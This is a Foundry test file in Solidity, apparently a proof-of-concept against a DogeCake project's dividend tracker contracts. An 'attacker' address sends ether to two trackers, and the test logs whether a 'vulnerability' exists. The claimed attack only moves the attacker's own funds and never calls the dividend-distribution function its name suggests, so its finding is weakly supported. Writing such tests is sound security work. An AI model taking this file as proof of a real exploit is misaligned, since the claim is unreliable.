// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DogeCake.sol";
import "../src/DogeCake.sol";

contract DividendTracker is DividendPayingToken {
    constructor(
        string memory _name,
        string memory _symbol,
        address _token
    ) DividendPayingToken(_name, _symbol, _token) {}
}

contract MockERC20 {
    function balanceOf(address) external pure returns (uint256) {
        return 1 ether;
    }
}

contract WrongDistributeDividendsTest is Test {
    address internal constant MOCK_TOKEN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address internal constant ATTACKER_ADDRESS = address(0x999);

    DividendTracker public cakeTracker;
    DividendTracker public dogeTracker;
    
    MockERC20 public mockCakeToken;
    MockERC20 public mockDogeToken;

    function setUp() public {
        // Deploy mock tokens for dividends
        mockCakeToken = new MockERC20();
        mockDogeToken = new MockERC20();

        // Deploy dividend trackers with mock token addresses
        cakeTracker = new DividendTracker(
            "CakeDiviTracker", 
            "CDT", 
            address(mockCakeToken)
        );
        
        dogeTracker = new DividendTracker(
            "DogeDiviTracker", 
            "DDT", 
            address(mockDogeToken)
        );

        // Fund attacker wallet
        vm.deal(ATTACKER_ADDRESS, 10 ether);
    }

    function test_AttackerCanCallDistributeDividends() public {
        // Define amount to send as attack
        uint256 attackAmount = 1 ether;

        // Pre-state recording
        console.log("--- BEFORE-Trigger State ---");
        console.log("CakeTracker ETH Balance:", address(cakeTracker).balance);
        console.log("DogeTracker ETH Balance:", address(dogeTracker).balance);
        console.log("Attacker ETH Balance:", ATTACKER_ADDRESS.balance);
        
        uint256 beforeCake = address(cakeTracker).balance;
        uint256 beforeDoge = address(dogeTracker).balance;
        uint256 beforeAttacker = ATTACKER_ADDRESS.balance;

        // Attack trigger
        console.log("--- Trigger Attack ---");
        vm.prank(ATTACKER_ADDRESS);
        payable(address(cakeTracker)).transfer(attackAmount);

        vm.prank(ATTACKER_ADDRESS);
        payable(address(dogeTracker)).transfer(attackAmount);
        
        // Post-state recording
        console.log("--- AFTER-Trigger State ---");
        console.log("CakeTracker ETH Balance:", address(cakeTracker).balance);
        console.log("DogeTracker ETH Balance:", address(dogeTracker).balance);
        console.log("Attacker ETH Balance:", ATTACKER_ADDRESS.balance);
        
        uint256 afterCake = address(cakeTracker).balance;
        uint256 afterDoge = address(dogeTracker).balance;
        uint256 afterAttacker = ATTACKER_ADDRESS.balance;

        // Differential verification
        uint256 cakeIncrease = afterCake - beforeCake;
        uint256 dogeIncrease = afterDoge - beforeDoge;
        uint256 attackerDecrease = beforeAttacker - afterAttacker;
        
        bool vulnerable = cakeIncrease == attackAmount &&
                         dogeIncrease == attackAmount &&
                         attackerDecrease == attackAmount * 2;
        
        console.log("CakeTracker Increase:", cakeIncrease);
        console.log("DogeTracker Increase:", dogeIncrease);
        console.log("Attacker Decrease:", attackerDecrease);
        console.log("Expected Attack Effect Achieved:", vulnerable);
        
        // Final verdict
        if (vulnerable) {
            console.log("Vulnerability Exists: Attacker successfully changed ETH balances in dividend trackers");
        } else {
            console.log("Vulnerability not Exist: ETH balances did not change as expected");
        }
        
        // Keep original verification
        assertEq(address(cakeTracker).balance, attackAmount, "Cake tracker ETH mismatch");
        assertEq(address(dogeTracker).balance, attackAmount, "Doge tracker ETH mismatch");
        assertEq(
            ATTACKER_ADDRESS.balance, 
            beforeAttacker - attackAmount * 2,
            "Attacker ETH balance mismatch"
        );
    }
}